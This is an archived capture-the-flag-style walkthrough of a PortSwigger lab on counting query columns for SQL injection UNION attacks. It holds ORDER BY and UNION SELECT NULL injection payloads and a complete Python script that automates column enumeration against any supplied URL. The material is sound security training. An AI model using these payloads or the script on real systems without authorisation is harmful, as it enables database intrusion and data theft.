# SQL Injection — Lab #3 SQLi UNION attack determining the number of columns returned by the query

- **Source URL:** https://m-abdullah-lab.medium.com/sql-injection-lab-3-sqli-union-attack-determining-the-number-of-columns-returned-by-the-query-3bc844343b40
- **Fetched from:** https://web.archive.org/web/20261003013758/https://m-abdullah-lab.medium.com/sql-injection-lab-3-sqli-union-attack-determining-the-number-of-columns-returned-by-the-query-3bc844343b40
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14930 (id 14930)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# SQL Injection — Lab #3 SQLi UNION attack determining the number of columns returned by the query

## Post Overview

This post is a detailed walkthrough of **Lab #3** from the PortSwigger Web Security Academy.

- **Topic:** SQL Injection (SQLi) UNION Attacks.
- **Specific Goal:** Determine the **number of columns** returned by the original query.
- **Why this is important:** To perform a UNION attack (which allows you to retrieve data from *other* tables), your injected query must have the **same number of columns** as the original query. This lab is the first step in that process.

## **1. The Scenario & Objective**

- **Lab:** SQL injection union attack determining the number of columns returned by the query.
- **Vulnerability Location:** The `category` filter parameter in the URL (e.g., `/filter?category=Gifts`).
- **The Challenge:** You cannot see the backend query. You need to figure out how many columns it selects so you can construct a valid `UNION` payload.

## **2. Theory: The UNION Operator**

Before exploiting, the post explains the rules of the SQL `UNION` operator:

1. **Rule 1 (The Focus of this Lab):** The number of columns in the injected query must match the number of columns in the original query.
2. **Rule 2:** The data types of the columns must be compatible (covered in the next lab).

**Concept:**

- Original Query: `SELECT A, B FROM Table1` (2 Columns)
- Injected Query: `UNION SELECT C, D FROM Table2` (2 Columns) -> **Valid**
- Injected Query: `UNION SELECT C FROM Table2` (1 Column) -> **Error**

## **3. Manual Exploitation Steps**

The post demonstrates two methods to find the column count.

### Method A: Using

### `ORDER BY`

### (The “Clean” Way)

This method asks the database to sort the results by column number X. If column X doesn’t exist, the database throws an error.

- **Payload 1:** `' ORDER BY 1 --`
- *Result:* 200 OK (Column 1 exists).
- **Payload 2:** `' ORDER BY 2 --`
- *Result:* 200 OK (Column 2 exists).
- **Payload 3:** `' ORDER BY 3 --`
- *Result:* 200 OK (Column 3 exists).
- **Payload 4:** `' ORDER BY 4 --`
- *Result:* **Internal Server Error (500)**.
- *Conclusion:* The query has **3 columns** (since the 4th one failed).

### Method B: Using

### `UNION SELECT NULL`

### (The “PortSwigger” Way)

This method involves injecting a `UNION` statement with an increasing number of `NULL` values until the error disappears.

- **Payload 1:** `' UNION SELECT NULL --`
- *Result:* Error (Column count mismatch).
- **Payload 2:** `' UNION SELECT NULL, NULL --`
- *Result:* Error.
- **Payload 3:** `' UNION SELECT NULL, NULL, NULL --`
- *Result:* **200 OK**.
- *Conclusion:* The error disappeared with 3 NULLs, so there are **3 columns**.

## **4. Automated Exploitation (Python Scripting)**

The instructor writes a Python script to automate the `ORDER BY` method. This is useful for large applications or when manual testing is tedious.

### Script Structure

1. **Libraries:** `requests` (HTTP), `sys` (Arguments), `urllib3` (SSL warnings).
2. **Proxy:** Configured to route through Burp Suite (`127.0.0.1:8080`) for debugging.
3. **The Loop Logic:**
4. Loop from `i = 1` to `50` (an arbitrary upper limit).
5. Construct the payload: `"ORDER BY " + i + "--"`.
6. Send the request.
7. **Check Condition:** If the response contains “Internal Server Error”, it means we hit the limit. The number of columns is `i - 1`.

### Key Code Logic (Conceptual):

```
import requests
import sys
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    return url
def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        try:
            r = requests.get(
                url + path + sql_payload,
                verify=False,
                proxies=PROXIES,
                timeout=10
            )
            if "Internal Server Error" in r.text:
                return i - 1
        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")
            return False
    return False
def main():
    parser = argparse.ArgumentParser(
        description="SQLi ORDER BY column count detector"
    )
    parser.add_argument("url", nargs="?", help="Target base URL")
    args = parser.parse_args()
    # Interactive fallback
    url = args.url or input("Enter target URL: ").strip()
    url = normalize_url(url)
    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print(f"[+] The number of columns is {num_col}.")
    else:
        print("[-] The SQLi attack was not successful.")
if __name__ == "__main__":
    main()
```
## **5. Key Takeaways**

- **ORDER BY**
 **is often faster** than `UNION SELECT` for counting columns because you just increment a number rather than adding specific `NULL` strings.
- **NULL**
 **is the safest value** to use in `UNION` attacks because it is compatible with every data type (String, Integer, Date, etc.).
- **Always Debug Scripts:** Sending script traffic through a proxy (Burp) is essential to catch simple errors like malformed URLs or bad encoding.
